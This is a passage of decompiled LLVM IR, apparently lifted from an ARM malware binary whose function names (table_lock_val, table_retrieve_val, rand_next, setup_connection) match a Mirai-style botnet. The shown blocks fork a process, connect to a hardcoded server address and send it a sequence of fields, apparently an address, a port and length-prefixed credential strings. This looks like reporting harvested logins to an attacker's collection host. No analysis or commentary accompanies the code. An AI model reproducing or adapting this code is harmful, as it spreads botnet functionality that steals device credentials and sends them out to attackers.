  store i32 %v2_f640, i32* %ip.global-to-local, align 4
  store i32 %v4_f638, i32* %stack_var_-42, align 4
  store i32 %v3_f63c, i32* %stack_var_-60, align 4
  %v1_f64c = inttoptr i32 %v0_f638 to i32*
  %v2_f64c = load i32, i32* %v1_f64c, align 4
  store i32 %v2_f64c, i32* @r8, align 4
  %v0_f650 = call i32 @__libc_fork()
  store i32 %v0_f650, i32* %r0.global-to-local, align 4
  %v7_f654 = icmp eq i32 %v0_f650, -1
  %.463 = zext i1 %v7_f654 to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f660 = icmp eq i32 %v0_f650, 0
  store i1 %v2_f660, i1* %cpsr_z.global-to-local, align 1
  %tmp456 = icmp slt i32 %v0_f650, 1
  br i1 %tmp456, label %bb457, label %.thread144

.thread144:                                       ; preds = %dec_label_pc_f638
  store i32 1, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f674

bb457:                                            ; preds = %dec_label_pc_f638
  store i32 %.463, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f66c = icmp eq i1 %v7_f654, false
  store i1 %v2_f66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f66c, label %dec_label_pc_f7fc, label %dec_label_pc_f674

dec_label_pc_f674:                                ; preds = %.thread144, %bb457
  %v0_f674 = load i32, i32* @r6, align 4
  %v1_f674 = add i32 %v0_f674, 4
  %v2_f674 = inttoptr i32 %v1_f674 to i32*
  %v3_f674 = load i32, i32* %v2_f674, align 4
  store i32 %v3_f674, i32* %r0.global-to-local, align 4
  %v1_f678 = call i32 @__GI___libc_close(i32 %v3_f674)
  store i32 %v1_f678, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_f680 = load i32, i32* @r4, align 4
  %v1_f680 = load i32, i32* @r6, align 4
  %v2_f680 = add i32 %v1_f680, 4
  %v3_f680 = inttoptr i32 %v2_f680 to i32*
  store i32 %v0_f680, i32* %v3_f680, align 4
  %v0_f684 = load i32, i32* @r3, align 4
  %v1_f684 = load i32, i32* @r6, align 4
  %v2_f684 = add i32 %v1_f684, 12
  %v3_f684 = inttoptr i32 %v2_f684 to i32*
  store i32 %v0_f684, i32* %v3_f684, align 4
  br label %dec_label_pc_f3e8

dec_label_pc_f68c:                                ; preds = %dec_label_pc_f558
  store i32 %v2_f518, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_f698 = add i32 %v0_f544, 4
  %v2_f698 = inttoptr i32 %v1_f698 to i32*
  %v3_f698 = load i32, i32* %v2_f698, align 4
  store i32 %v3_f698, i32* %r0.global-to-local, align 4
  %v4_f69c = call i32 @__libc_send(i32 %v3_f698, i32 %v2_f518, i32 3, i32 16384)
  store i32 %v4_f69c, i32* %r0.global-to-local, align 4
  %v0_f6a0 = load i32, i32* @r6, align 4
  %v1_f6a0 = add i32 %v0_f6a0, 4
  %v2_f6a0 = inttoptr i32 %v1_f6a0 to i32*
  %v3_f6a0 = load i32, i32* %v2_f6a0, align 4
  store i32 %v3_f6a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_efe0

dec_label_pc_f6b0:                                ; preds = %dec_label_pc_ebdc
  store i32 %.pre282, i32* @r0, align 4
  %v1_f6b8 = add i32 %v0_f6b0, 92
  store i32 %v1_f6b8, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_f6c0 = call i32 @memmove(i32 %.pre282, i32 %v1_f6b8, i32 192)
  store i32 %v3_f6c0, i32* %r0.global-to-local, align 4
  %v0_f6c4 = load i32, i32* @r6, align 4
  %v1_f6c4 = add i32 %v0_f6c4, 24
  %v2_f6c4 = inttoptr i32 %v1_f6c4 to i32*
  %v3_f6c4 = load i32, i32* %v2_f6c4, align 4
  %v1_f6c8 = add i32 %v3_f6c4, -64
  store i32 %v1_f6c8, i32* %r3.global-to-local, align 4
  store i32 %v1_f6c8, i32* %v2_f6c4, align 4
  br label %dec_label_pc_ebec

dec_label_pc_f6d4:                                ; preds = %dec_label_pc_ed2c
  %v0_f6d4 = load i32, i32* @r6, align 4
  store i32 %v0_f6d4, i32* @r0, align 4
  %v0_f6d8 = call i32 @setup_connection()
  store i32 %v0_f6d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed68

dec_label_pc_f6e0:                                ; preds = %dec_label_pc_eb94
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_e304, i32* %r3.global-to-local, align 4
  store i32 %v2_f484, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v5_f708 = call i32 @getsockopt(i32 %v3_eb88, i32 1, i32 4, i32 %v2_e304, i32 %v2_f484)
  %v3_f70c = load i8, i8* %stack_var_-56, align 1
  %v4_f70c = sext i8 %v3_f70c to i32
  store i32 %v4_f70c, i32* %r3.global-to-local, align 4
  %v2_f710 = or i32 %v4_f70c, %v5_f708
  store i32 %v2_f710, i32* %r0.global-to-local, align 4
  %v4_f710 = icmp eq i32 %v2_f710, 0
  store i1 %v4_f710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f710, label %dec_label_pc_f718, label %dec_label_pc_f7c4

dec_label_pc_f718:                                ; preds = %dec_label_pc_f6e0
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_f71c = load i32, i32* @r6, align 4
  %v2_f71c = add i32 %v1_f71c, 12
  %v3_f71c = inttoptr i32 %v2_f71c to i32*
  store i32 2, i32* %v3_f71c, align 4
  %v0_f720 = call i32 @rand_next()
  %v2_f728 = load i16, i16* bitcast (i16** @global_var_21724.139 to i16*), align 4
  %v3_f728 = zext i16 %v2_f728 to i32
  %v2_f72c = udiv i32 %v0_f720, %v3_f728
  %v3_f72c = urem i32 %v0_f720, %v3_f728
  store i32 %v2_f72c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_216f4.135 to i32), i32* %r3.global-to-local, align 4
  %v2_f734 = load i32, i32* @global_var_216f4.135, align 4
  store i32 %v2_f734, i32* %ip.global-to-local, align 4
  %v1_f73c = load i32, i32* @r4, align 4
  %v9_f73c = icmp eq i32 %v2_f734, %v1_f73c
  store i1 %v9_f73c, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_f72c, i32* %r1.global-to-local, align 4
  %v7_f744 = icmp sgt i32 %v2_f734, %v1_f73c
  br i1 %v7_f744, label %dec_label_pc_f748, label %dec_label_pc_f788

dec_label_pc_f748:                                ; preds = %dec_label_pc_f718
  %v2_f74c = load i32, i32* @global_var_21720.137, align 4
  store i32 %v2_f74c, i32* %r3.global-to-local, align 4
  store i32 %v1_f73c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f768

dec_label_pc_f758:                                ; preds = %dec_label_pc_f778, %dec_label_pc_f768
  %v1_f758 = add i32 %v0_f758, 1
  store i32 %v1_f758, i32* %r2.global-to-local, align 4
  %v9_f75c = icmp eq i32 %v1_f758, %v2_f734
  %v1_f760 = add i32 %v0_f760, 16
  store i32 %v1_f760, i32* %r3.global-to-local, align 4
  br i1 %v9_f75c, label %dec_label_pc_f788.loopexit, label %dec_label_pc_f768

dec_label_pc_f768:                                ; preds = %dec_label_pc_f758, %dec_label_pc_f748
  %v0_f758 = phi i32 [ %v1_f758, %dec_label_pc_f758 ], [ %v1_f73c, %dec_label_pc_f748 ]
  %v0_f760 = phi i32 [ %v1_f760, %dec_label_pc_f758 ], [ %v2_f74c, %dec_label_pc_f748 ]
  store i32 %v0_f760, i32* %r0.global-to-local, align 4
  %v1_f76c = add i32 %v0_f760, 8
  %v2_f76c = inttoptr i32 %v1_f76c to i16*
  %v3_f76c = load i16, i16* %v2_f76c, align 2
  %v4_f76c = zext i16 %v3_f76c to i32
  store i32 %v4_f76c, i32* %r3.global-to-local, align 4
  %tmp458 = icmp ugt i32 %v4_f76c, %v3_f72c
  br i1 %tmp458, label %dec_label_pc_f758, label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %dec_label_pc_f768
  %v1_f778 = add i32 %v0_f760, 10
  %v2_f778 = inttoptr i32 %v1_f778 to i16*
  %v3_f778 = load i16, i16* %v2_f778, align 2
  %v4_f778 = zext i16 %v3_f778 to i32
  store i32 %v4_f778, i32* %r3.global-to-local, align 4
  %v3_f77c = icmp uge i32 %v4_f778, %v3_f72c
  %v9_f77c = icmp eq i32 %v4_f778, %v3_f72c
  %v2_f780 = xor i1 %v3_f77c, true
  %v3_f780 = or i1 %v9_f77c, %v2_f780
  br i1 %v3_f780, label %dec_label_pc_f758, label %dec_label_pc_f78c.loopexit

dec_label_pc_f788.loopexit:                       ; preds = %dec_label_pc_f758
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f788

dec_label_pc_f788:                                ; preds = %dec_label_pc_f788.loopexit, %dec_label_pc_f718
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f78c

dec_label_pc_f78c.loopexit:                       ; preds = %dec_label_pc_f778
  store i1 %v3_f77c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f78c

dec_label_pc_f78c:                                ; preds = %dec_label_pc_f78c.loopexit, %dec_label_pc_f788
  %v0_f7a0 = phi i32 [ %v0_f760, %dec_label_pc_f78c.loopexit ], [ 0, %dec_label_pc_f788 ]
  %v0_f78c = load i32, i32* @r6, align 4
  %v1_f78c = add i32 %v0_f78c, 4
  %v2_f78c = inttoptr i32 %v1_f78c to i32*
  %v3_f78c = load i32, i32* %v2_f78c, align 4
  %v3_f790 = udiv i32 %v3_f78c, 32
  store i32 %v3_f790, i32* %r2.global-to-local, align 4
  %v1_f794 = urem i32 %v3_f78c, 32
  store i32 %v1_f794, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_f798 = mul nuw nsw i32 %v3_f790, 4
  store i32 %v3_f798, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_f7a0 = inttoptr i32 %v0_f78c to i32*
  store i32 %v0_f7a0, i32* %v2_f7a0, align 4
  %v0_f7a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_f7a4 = load i32, i32* @r6, align 4
  %v2_f7a4 = add i32 %v1_f7a4, 24
  %v3_f7a4 = inttoptr i32 %v2_f7a4 to i32*
  store i32 %v0_f7a4, i32* %v3_f7a4, align 4
  %v0_ebbc.pre = load i32, i32* @ip, align 4
  %v1_ebc4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ebb8

dec_label_pc_f7ac:                                ; preds = %dec_label_pc_f4d0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f7b0 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f7b8 = call i32 @table_lock_val(i32 27)
  store i32 %v1_f7b8, i32* %r0.global-to-local, align 4
  %v0_f7bc = load i32, i32* @r6, align 4
  %v1_f7bc = add i32 %v0_f7bc, 12
  %v2_f7bc = inttoptr i32 %v1_f7bc to i32*
  %v3_f7bc = load i32, i32* %v2_f7bc, align 4
  store i32 %v3_f7bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ebd4.backedge

dec_label_pc_f7c4:                                ; preds = %dec_label_pc_f6e0
  %v0_f7c4 = load i32, i32* @r6, align 4
  %v1_f7c4 = add i32 %v0_f7c4, 4
  %v2_f7c4 = inttoptr i32 %v1_f7c4 to i32*
  %v3_f7c4 = load i32, i32* %v2_f7c4, align 4
  store i32 %v3_f7c4, i32* %r0.global-to-local, align 4
  %v1_f7c8 = call i32 @__GI___libc_close(i32 %v3_f7c4)
  store i32 %v1_f7c8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_f7d0 = load i32, i32* @r4, align 4
  %v1_f7d0 = load i32, i32* @r6, align 4
  %v2_f7d0 = add i32 %v1_f7d0, 12
  %v3_f7d0 = inttoptr i32 %v2_f7d0 to i32*
  store i32 %v0_f7d0, i32* %v3_f7d0, align 4
  %v0_f7d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_f7d4 = load i32, i32* @r6, align 4
  %v2_f7d4 = add i32 %v1_f7d4, 4
  %v3_f7d4 = inttoptr i32 %v2_f7d4 to i32*
  store i32 %v0_f7d4, i32* %v3_f7d4, align 4
  %v0_f7d8 = load i32, i32* @r4, align 4
  %v1_f7d8 = trunc i32 %v0_f7d8 to i8
  %v2_f7d8 = load i32, i32* @r6, align 4
  %v3_f7d8 = add i32 %v2_f7d8, 284
  %v4_f7d8 = inttoptr i32 %v3_f7d8 to i8*
  store i8 %v1_f7d8, i8* %v4_f7d8, align 1
  br label %dec_label_pc_ecd8

dec_label_pc_f7e0:                                ; preds = %dec_label_pc_ec88
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_f7e4 = load i32, i32* @fp, align 4
  %v2_f7e4 = inttoptr i32 %v1_f7e4 to i32*
  store i32 104, i32* %v2_f7e4, align 4
  br label %dec_label_pc_eca0

dec_label_pc_f7ec:                                ; preds = %thread-pre-split124
  store i32 %v1_f7f0, i32* %r0.global-to-local, align 4
  %v0_f7f4 = load i32, i32* @r6, align 4
  %v1_f7f4 = add i32 %v0_f7f4, 12
  %v2_f7f4 = inttoptr i32 %v1_f7f4 to i32*
  %v3_f7f4 = load i32, i32* %v2_f7f4, align 4
  store i32 %v3_f7f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ebd4.backedge

dec_label_pc_ebd4.backedge.thread:                ; preds = %dec_label_pc_ed94, %dec_label_pc_ee68, %dec_label_pc_f00c, %dec_label_pc_f0e0, %dec_label_pc_f22c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ebdc

dec_label_pc_ebd4.backedge.thread559:             ; preds = %dec_label_pc_f144, %dec_label_pc_f070, %dec_label_pc_f290, %dec_label_pc_eecc, %dec_label_pc_edf8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ebdc

dec_label_pc_ebd4.backedge:                       ; preds = %dec_label_pc_ec50, %dec_label_pc_f7ec, %dec_label_pc_f7ac
  %v0_ebdc228 = phi i32 [ %v0_f7bc, %dec_label_pc_f7ac ], [ %v0_f7f4, %dec_label_pc_f7ec ], [ %v0_ec50, %dec_label_pc_ec50 ]
  %v0_ebd4.be = phi i32 [ %v3_f7bc, %dec_label_pc_f7ac ], [ %v3_f7f4, %dec_label_pc_f7ec ], [ %v3_ec50, %dec_label_pc_ec50 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ebd4 = icmp eq i32 %v0_ebd4.be, 0
  store i1 %v2_ebd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebd4, label %dec_label_pc_ecd8, label %dec_label_pc_ebdc

dec_label_pc_f7fc:                                ; preds = %bb457
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f808 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_f808, i32* %r0.global-to-local, align 4
  %v2_f80c = icmp eq i32 %v3_f808, -1
  store i1 %v2_f80c, i1* %cpsr_c.global-to-local, align 1
  %v7_f80c = icmp eq i32 %v3_f808, -1
  store i1 %v7_f80c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f808, i32* @r4, align 4
  br i1 %v7_f80c, label %dec_label_pc_f890, label %dec_label_pc_f818

dec_label_pc_f818:                                ; preds = %dec_label_pc_f7fc
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f81c = call i32 @table_unlock_val(i32 2)
  store i32 %v2_f640, i32* @lr, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_18d6c.85 to i32), i32* @r0, align 4
  %v2_f830 = call i32 @inet_addr(i32 ptrtoint ([13 x i8]* @global_var_18d6c.85 to i32))
  %v0_f834 = load i32, i32* @r5, align 4
  store i32 %v0_f834, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_f840 = inttoptr i32 %v0_f834 to i32*
  %v3_f840 = call i32 @table_retrieve_val(i32 2, i32* %v2_f840)
  store i32 %v2_f640, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f854 = call i32 @table_lock_val(i32 2)
  %v0_f85c = load i32, i32* @r4, align 4
  store i32 %v0_f85c, i32* %r0.global-to-local, align 4
  store i32 %v2_e510, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_f868 = call i32 @__libc_connect(i32 %v0_f85c, i32 %v2_e510, i32 16)
  store i32 %v3_f868, i32* %r0.global-to-local, align 4
  %v3_f86c = icmp eq i32 %v3_f868, -1
  store i1 %v3_f86c, i1* %cpsr_c.global-to-local, align 1
  %v8_f86c = icmp eq i32 %v3_f868, -1
  store i1 %v8_f86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f86c, label %dec_label_pc_f874, label %dec_label_pc_f898

dec_label_pc_f874:                                ; preds = %dec_label_pc_f818
  %v0_f874 = load i32, i32* @r4, align 4
  store i32 %v0_f874, i32* %r0.global-to-local, align 4
  %v1_f878 = call i32 @__GI___libc_close(i32 %v0_f874)
  %v0_f87c = load i32, i32* @r5, align 4
  store i32 %v0_f87c, i32* %r0.global-to-local, align 4
  %v1_f880 = call i32 @__GI_exit(i32 %v0_f87c)
  store i32 %v1_f880, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f884

dec_label_pc_f884:                                ; preds = %dec_label_pc_e2e0, %dec_label_pc_f874
  store i32 ptrtoint (i32* @global_var_24210.147 to i32), i32* %ip.global-to-local, align 4
  %v2_f888 = load i32, i32* @global_var_24210.147, align 4
  store i32 %v2_f888, i32* %r0.global-to-local, align 4
  %v1_f88c = call i32 @__GI___libc_close(i32 %v2_f888)
  store i32 %v1_f88c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f890

dec_label_pc_f890:                                ; preds = %dec_label_pc_e2bc.dec_label_pc_f890_crit_edge, %dec_label_pc_f7fc, %dec_label_pc_f898, %dec_label_pc_f884
  %.pre.pre-phi = phi i32 [ %.pre283, %dec_label_pc_e2bc.dec_label_pc_f890_crit_edge ], [ %v2_e304, %dec_label_pc_f7fc ], [ %v2_f898.pre-phi, %dec_label_pc_f898 ], [ %v2_e304, %dec_label_pc_f884 ]
  %v0_f890 = load i32, i32* @r5, align 4
  store i32 %v0_f890, i32* %r0.global-to-local, align 4
  %v1_f894 = call i32 @__GI_exit(i32 %v0_f890)
  store i32 %v1_f894, i32* %r0.global-to-local, align 4
  %.pre281 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_f898

dec_label_pc_f898:                                ; preds = %dec_label_pc_f818, %dec_label_pc_f890
  %v2_f8b8.pre-phi = phi i32 [ %v2_f484, %dec_label_pc_f818 ], [ %.pre281, %dec_label_pc_f890 ]
  %v2_f898.pre-phi = phi i32 [ %v2_e304, %dec_label_pc_f818 ], [ %.pre.pre-phi, %dec_label_pc_f890 ]
  store i32 %v2_f898.pre-phi, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f8a4 = load i32, i32* @r4, align 4
  store i32 %v0_f8a4, i32* %r0.global-to-local, align 4
  %v0_f8a8 = load i32, i32* @r5, align 4
  %v6_f8a8 = trunc i32 %v0_f8a8 to i8
  store i8 %v6_f8a8, i8* %stack_var_-56, align 1
  %v6_f8ac = call i32 @__libc_send(i32 %v0_f8a4, i32 %v2_f898.pre-phi, i32 1, i32 16384)
  %v0_f8b4 = load i32, i32* @r4, align 4
  store i32 %v0_f8b4, i32* %r0.global-to-local, align 4
  store i32 %v2_f8b8.pre-phi, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f8c4 = call i32 @__libc_send(i32 %v0_f8b4, i32 %v2_f8b8.pre-phi, i32 4, i32 16384)
  %v0_f8cc = load i32, i32* @r4, align 4
  store i32 %v0_f8cc, i32* %r0.global-to-local, align 4
  %v2_f8d0 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_f8d0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f8dc = call i32 @__libc_send(i32 %v0_f8cc, i32 %v2_f8d0, i32 2, i32 16384)
  %v0_f8e0 = load i32, i32* @r8, align 4
  %v1_f8e0 = add i32 %v0_f8e0, 12
  store i32 %v1_f8e0, i32* %r1.global-to-local, align 4
  %v0_f8e4 = load i32, i32* @r4, align 4
  store i32 %v0_f8e4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f8f0 = call i32 @__libc_send(i32 %v0_f8e4, i32 %v1_f8e0, i32 1, i32 16384)
  store i32 %v4_f8f0, i32* %r0.global-to-local, align 4
  %v0_f8f4 = load i32, i32* @r8, align 4
  %v1_f8f4 = inttoptr i32 %v0_f8f4 to i32*
  %v2_f8f4 = load i32, i32* %v1_f8f4, align 4
  store i32 %v2_f8f4, i32* %r1.global-to-local, align 4
  %v1_f8f8 = add i32 %v0_f8f4, 12
  %v2_f8f8 = inttoptr i32 %v1_f8f8 to i8*
  %v3_f8f8 = load i8, i8* %v2_f8f8, align 1
  %v4_f8f8 = zext i8 %v3_f8f8 to i32
  store i32 %v4_f8f8, i32* %r2.global-to-local, align 4
  %v0_f8fc = load i32, i32* @r4, align 4
  store i32 %v0_f8fc, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f904 = call i32 @__libc_send(i32 %v0_f8fc, i32 %v2_f8f4, i32 %v4_f8f8, i32 16384)
  %v0_f908 = load i32, i32* @r8, align 4
  %v1_f908 = add i32 %v0_f908, 13
  store i32 %v1_f908, i32* %r1.global-to-local, align 4
  %v0_f90c = load i32, i32* @r4, align 4
  store i32 %v0_f90c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f918 = call i32 @__libc_send(i32 %v0_f90c, i32 %v1_f908, i32 1, i32 16384)
  %v0_f91c = load i32, i32* @r4, align 4
  store i32 %v0_f91c, i32* %r0.global-to-local, align 4
  %v0_f920 = load i32, i32* @r8, align 4
  %v1_f920 = add i32 %v0_f920, 13
  %v2_f920 = inttoptr i32 %v1_f920 to i8*
  %v3_f920 = load i8, i8* %v2_f920, align 1
  %v4_f920 = zext i8 %v3_f920 to i32
  store i32 %v4_f920, i32* %r2.global-to-local, align 4
  %v1_f924 = add i32 %v0_f920, 4
  %v2_f924 = inttoptr i32 %v1_f924 to i32*
  %v3_f924 = load i32, i32* %v2_f924, align 4
  store i32 %v3_f924, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f92c = call i32 @__libc_send(i32 %v0_f91c, i32 %v3_f924, i32 %v4_f920, i32 16384)
  %v0_f930 = load i32, i32* @r4, align 4
  store i32 %v0_f930, i32* %r0.global-to-local, align 4
  %v1_f934 = call i32 @__GI___libc_close(i32 %v0_f930)
  store i32 %v1_f934, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f890

; uselistorder directives
  uselistorder i32 %v2_f898.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v2_f8b8.pre-phi, { 1, 0 }
  uselistorder i1 %v7_f80c, { 1, 0 }
  uselistorder i32 %v3_f808, { 1, 0, 2, 3 }
  uselistorder i32 %v3_f78c, { 1, 0 }
  uselistorder i1 %v3_f77c, { 1, 0 }
  uselistorder i32 %v0_f760, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_f72c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_f728, { 1, 0 }
  uselistorder i32 %v0_f720, { 1, 0 }
  uselistorder i32 %v3_f6a0, { 1, 0 }
  uselistorder i1 %v2_f66c, { 1, 0 }
  uselistorder i32 %.463, { 1, 0 }
  uselistorder i1 %v7_f654, { 1, 0 }
  uselistorder i32 %v0_f650, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f628, { 1, 0 }
  uselistorder i32 %v0_f628, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f578.pr, { 1, 0 }
  uselistorder i32 %v0_f544, { 1, 2, 0 }
  uselistorder i32 %v4_f4e4, { 1, 0, 2 }
  uselistorder i1 %v7_f4c0, { 1, 0 }
  uselistorder i32 %v1_f468, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f468, { 0, 2, 1 }
  uselistorder i32 %v0_f460, { 1, 0 }
  uselistorder i1 %v7_f45c, { 1, 0 }
  uselistorder i1 %v7_f454, { 1, 0 }
  uselistorder i1 %v7_f44c, { 1, 0 }
  uselistorder i1 %v8_f444, { 1, 0 }
  uselistorder i1 %v7_f428, { 1, 0 }
  uselistorder i1 %v7_f420, { 1, 0 }
  uselistorder i1 %v7_f418, { 1, 0 }
  uselistorder i1 %v8_f410, { 1, 0 }
  uselistorder i32 %v1_f3f8, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v0_f3a4, { 1, 0 }
  uselistorder i32 %v4_f398, { 1, 0, 2 }
  uselistorder i32 %v1_f364, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f364, { 0, 2, 1 }
  uselistorder i32 %v0_f35c, { 1, 0 }
  uselistorder i1 %v7_f358, { 1, 0 }
  uselistorder i1 %v7_f350, { 1, 0 }
  uselistorder i1 %v8_f348, { 1, 0 }
  uselistorder i1 %v7_f32c, { 1, 0 }
  uselistorder i1 %v7_f324, { 1, 0 }
  uselistorder i1 %v8_f31c, { 1, 0 }
  uselistorder i32 %v1_f304, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_f2a0, { 1, 0 }
  uselistorder i8 %v3_f298, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f290, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f290, { 0, 2, 1 }
  uselistorder i32 %v0_f288, { 1, 0 }
  uselistorder i1 %v7_f284, { 1, 0 }
  uselistorder i1 %v7_f27c, { 1, 0 }
  uselistorder i1 %v7_f274, { 1, 0 }
  uselistorder i1 %v7_f260, { 1, 0 }
  uselistorder i1 %v7_f258, { 1, 0 }
  uselistorder i1 %v7_f250, { 1, 0 }
  uselistorder i1 %v8_f248, { 1, 0 }
  uselistorder i32 %v1_f230, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f154, { 1, 0 }
  uselistorder i8 %v3_f14c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f144, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f144, { 0, 2, 1 }
  uselistorder i32 %v0_f13c, { 1, 0 }
  uselistorder i1 %v7_f138, { 1, 0 }
  uselistorder i1 %v7_f130, { 1, 0 }
  uselistorder i1 %v7_f128, { 1, 0 }
  uselistorder i1 %v7_f114, { 1, 0 }
  uselistorder i1 %v7_f10c, { 1, 0 }
  uselistorder i1 %v7_f104, { 1, 0 }
  uselistorder i1 %v8_f0fc, { 1, 0 }
  uselistorder i32 %v1_f0e4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f080, { 1, 0 }
  uselistorder i8 %v3_f078, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f070, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f070, { 0, 2, 1 }
  uselistorder i32 %v0_f068, { 1, 0 }
  uselistorder i1 %v7_f064, { 1, 0 }
  uselistorder i1 %v7_f05c, { 1, 0 }
  uselistorder i1 %v7_f054, { 1, 0 }
  uselistorder i1 %v7_f040, { 1, 0 }
  uselistorder i1 %v7_f038, { 1, 0 }
  uselistorder i1 %v7_f030, { 1, 0 }
  uselistorder i1 %v8_f028, { 1, 0 }
  uselistorder i32 %v1_f010, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_effc, { 1, 0 }
  uselistorder i32 %v1_eff4, { 1, 0 }
  uselistorder i32 %v1_efec, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_efe8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_efe8, { 0, 2, 1 }
  uselistorder i32 %v0_efc8.pr, { 1, 0 }
  uselistorder i32 %v0_efa8.pr, { 1, 0 }
  uselistorder i1 %v7_ef80, { 1, 0 }
  uselistorder i1 %v2_ef70, { 1, 0, 2 }
  uselistorder i1 %v2_ef54, { 1, 0, 2 }
  uselistorder i32 %v1_ef74, { 1, 2, 3, 0 }
